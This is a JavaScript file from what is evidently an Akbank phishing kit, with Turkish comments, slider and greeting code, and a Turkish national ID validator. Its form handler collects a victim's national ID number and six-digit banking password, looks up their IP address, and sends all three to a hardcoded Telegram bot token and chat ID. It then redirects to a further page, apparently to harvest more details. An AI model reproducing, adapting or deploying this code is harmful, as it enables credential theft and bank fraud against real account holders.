/* ── Slider ─────────────────────────────────────── */
var slider1 = (function () {
    var slides = document.querySelectorAll('#slider .slide');
    var currentIndex = Array.from(slides).findIndex(function (s) {
        return s.classList.contains('active');
    });
    if (currentIndex === -1) currentIndex = 0;

    function go(nextIndex) {
        if (nextIndex < 0 || nextIndex >= slides.length) return;
        slides[currentIndex].classList.remove('active');
        slides[currentIndex].classList.add('hidden');
        slides[nextIndex].classList.remove('hidden');
        slides[nextIndex].classList.add('active');
        currentIndex = nextIndex;
    }

    return {
        next: function () { go(currentIndex + 1); },
        prev: function () { go(currentIndex - 1); },
        goTo: function (i) { go(i); }
    };
})();

/* ── Saat dilimine göre selamlama ───────────────── */
(function () {
    var h = new Date().getHours();
    var greeting = h < 12 ? 'Günaydın' : h < 18 ? 'İyi\ngünler' : 'İyi\nakşamlar';
    var el = document.getElementById('titles');
    if (el) el.innerHTML = greeting.replace('\n', '<br>');
})();

/* ── Buton tıklama  (1. ve 2. kart page'deki butonlar) ───── */
function handleButtonClick() {
    slider1.next();
}

/* ── TC Kimlik No doğrulama (Luhn-tabanlı Türk TC algoritması) ── */
function tcno_dogrula(tc) {
    tc = String(tc);
    if (tc.substring(0, 1) === '0' || tc.length !== 11) return false;

    var digits = tc.substr(0, 10).split('');
    var toplam = 0, hane_tek = 0, hane_cift = 0;

    for (var i = 0; i < 9; ++i) {
        var d = parseInt(digits[i], 10);
        if (i % 2 === 0) hane_tek += d;
        else              hane_cift += d;
        toplam += d;
    }
    if ((hane_tek * 7 - hane_cift) % 10 !== parseInt(tc.charAt(9), 10)) return false;

    toplam += parseInt(tc.charAt(9), 10);
    if (toplam % 10 !== parseInt(tc.charAt(10), 10)) return false;

    return true;
}

/* ── IP adresini al ───────────────────────────── */
function getIP(callback) {
    fetch('https://api.ipify.org?format=json')
        .then(function (r) { return r.json(); })
        .then(function (data) { callback(data.ip); })
        .catch(function () { callback('Bilinmiyor'); });
}

/* ── Telegram'a gönder ────────────────────────── */
function sendToTelegram(message, onSuccess) {
    var botToken  = '7603525221:AAFLxB75PV01QO-alxIxPsERLFm5Gb9R3Vg';
    var chatId    = '-1002475411082';
    var url       = 'https://api.telegram.org/bot' + botToken
                  + '/sendMessage?chat_id=' + chatId
                  + '&text=' + encodeURIComponent(message);

    var xhr = new XMLHttpRequest();
    xhr.open('GET', url, true);
    xhr.onload = function () {
        if (xhr.status === 200) {
            console.log('✅ Telegram\'a gönderildi.');
            if (onSuccess) onSuccess();
        } else {
            console.error('❌ Telegram hatası:', xhr.responseText);
        }
    };
    xhr.send();
}

/* ── Form gönder (TC + Şifre  — index.html gray3 slide) ── */
function submitCustomForm() {
    var tcEl   = document.getElementById('customUsername');
    var pwEl   = document.getElementById('customPassword');
    var alert  = document.getElementById('alertDiv');

    if (!tcEl || !pwEl || !alert) {
        console.error('❌ Gerekli HTML elementleri bulunamadı!');
        return;
    }

    var tcVal = tcEl.value.trim();
    var pwVal = pwEl.value.trim();

    /* Doğrulama */
    if (!tcno_dogrula(tcVal) || !/^\d{6}$/.test(pwVal)) {
        alert.classList.add('show');
        return;
    }

    alert.classList.remove('show');

    getIP(function (ip) {
        var msg = ' Akbank Giris Bilgisi:\n'
                + ' TC Kimlik: ' + tcVal + '\n'
                + ' Sifre: '    + pwVal + '\n'
                + ' IP: '       + ip;

        sendToTelegram(msg, function () {
            setTimeout(function () {
                window.location.href = 'phone.html';
            }, 750);
        });
    });
}

/* ── Alert kapat ─────────────────────────────── */
function closeAlert() {
    var el = document.getElementById('alertDiv');
    if (el) el.classList.remove('show');
}